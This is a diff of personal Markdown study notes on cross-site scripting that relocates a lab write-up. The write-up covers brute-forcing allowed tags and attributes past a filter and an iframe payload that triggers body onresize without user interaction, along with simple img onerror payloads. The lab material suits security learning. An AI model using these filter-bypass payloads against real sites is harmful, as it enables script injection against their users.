@@ -124,6 +124,45 @@ EXAMINE:
     searching the random value in the page source.
   * `<script>alert(1)</script>abc123xyz`, `abc123xyz<script>alert(1)</script>`
 
+EX:
+
+[[Reflected XSS into HTML context with most tags and attributes blocked]]
+
+test process:
+
+* see if you could add these to the examine part
+
+trying html tags and they get filtered:
+`<img src=1 onerror=print()>`
+
+`<>` aren't filtered.
+
+How to figure allowed tags? by bruteforcing, burp intruder is easy.
+if it's filtered, we get 400. 200 is a win.
+
+`<body>` isn't filtered.
+
+some attributes are filtered.
+
+bruteforcing attributes too.
+
+`GET /?search=<body%20$=1> HTTP/2`
+
+the `$` will be bruteforced.
+
+how to envoke the attack without user interaction:
+
+but we can't use `onload`. or can we?
+
+solution? run the page inside an `iframe`, on an attacker controlled page.
+we can resize the iframe on page load and the XSS will be executed automatically.
+
+it needs that the victim to visit the attacker controlled page.
+
+`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`
+
+the iframe being resized as soon as it's loaded, triggering `onresize` events.
+
 ## DOM-based cross-site scripting:
 
 attackers attack the Dom when a page takes user input and alters the Dom based
@@ -168,10 +207,10 @@ EX:
 * [[XSS_examples#jQuery anchor; sink: `href` attribute , source: `location.search`|jQuery anchor; sink: `href` attribute , source: `location.search`]]
 * [[XSS_examples#jQuery `selector` sink using a `hashchange` event|jQuery `selector` sink using a `hashchange` event]]
 * [[XSS_examples#AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS expression with angle brackets and double quotes HTML-encoded]]
+
 #### [[Reflected DOM XSS]]
 
 #### [[Stored DOM XSS]]
-
 
 # blocked
 
@@ -205,53 +244,15 @@ EX:
 * `<img onload=alert('the image has been loaded!') src="example.png">`
 * `<img src=1 onerror=alert(1)>`
 
-
 ## `iframe`
-
 
 ## `<select>``</select>`
 
-### XSS between HTML tags
+what to do with this? XSS between HTML tags
 
 When the XSS context is text between HTML tags, you need to add new HTML tags to
 trigger execution of JavaScript. e.g. `<img>`, `<script>`
 
-#### Reflected XSS into HTML context with most tags and attributes blocked
-
-test process:
-
-* see if you could add these to the examine part
-
-trying html tags and they get filtered:
-`<img src=1 onerror=print()>`
-
-`<>` aren't filtered.
-
-How to figure allowed tags? by bruteforcing, burp intruder is easy.
-if it's filtered, we get 400. 200 is a win.
-
-`<body>` isn't filtered.
-
-some attributes are filtered.
-
-bruteforcing attributes too.
-
-`GET /?search=<body%20$=1> HTTP/2`
-
-the `$` will be bruteforced.
-
-how to envoke the attack without user interaction:
-
-but we can't use `onload`. or can we?
-
-solution? run the page inside an `iframe`, on an attacker controlled page.
-we can resize the iframe on page load and the XSS will be executed automatically.
-
-it needs that the victim to visit the attacker controlled page.
-
-`<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E "onload=this.style.width='100px'>`
-
-the iframe being resized as soon as it's loaded, triggering `onresize` events.
 
 #### just custom tags allowed
 
